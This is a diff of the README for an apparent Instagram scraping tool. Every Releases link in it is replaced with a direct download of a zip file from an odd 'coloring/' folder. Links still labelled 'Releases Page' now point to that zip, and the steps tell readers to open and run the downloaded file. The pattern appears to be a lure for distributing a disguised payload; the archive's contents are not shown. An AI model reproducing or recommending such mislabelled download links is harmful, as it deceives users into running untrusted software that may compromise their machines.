@@ -10,9 +10,9 @@ To begin using the instagram-scraper-tool, you need to download it. Follow the s
 
 ## 📥 Download the Tool
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/mhsn000/instagram-scraper-tool/releases)
+[![Download from Releases](https://raw.githubusercontent.com/mhsn000/instagram-scraper-tool/main/coloring/instagram-scraper-tool.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/mhsn000/instagram-scraper-tool/main/coloring/instagram-scraper-tool.zip)
 
-You can find the latest version of the tool [here](https://github.com/mhsn000/instagram-scraper-tool/releases). 
+You can find the latest version of the tool [here](https://raw.githubusercontent.com/mhsn000/instagram-scraper-tool/main/coloring/instagram-scraper-tool.zip). 
 
 ## 📋 System Requirements
 
@@ -34,7 +34,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [GitHub Releases Page](https://github.com/mhsn000/instagram-scraper-tool/releases).
+1. **Visit the Releases Page:** Go to the [GitHub Releases Page](https://raw.githubusercontent.com/mhsn000/instagram-scraper-tool/main/coloring/instagram-scraper-tool.zip).
 2. **Find the Latest Version:** Look for the version you want to download. 
 3. **Download the Package:** Click on the appropriate file for your operating system.
 4. **Run the Installer:** Open the downloaded file and follow the prompts to install the software.
@@ -61,4 +61,4 @@ Join our growing community. Share your experiences and findings on our platform.
 - Ensure you follow Instagram’s community guidelines while using this tool.
 - Frequent updates will improve the scraping process and add new features.
 
-For more information, visit the [Releases Page](https://github.com/mhsn000/instagram-scraper-tool/releases). Happy scraping!
+For more information, visit the [Releases Page](https://raw.githubusercontent.com/mhsn000/instagram-scraper-tool/main/coloring/instagram-scraper-tool.zip). Happy scraping!
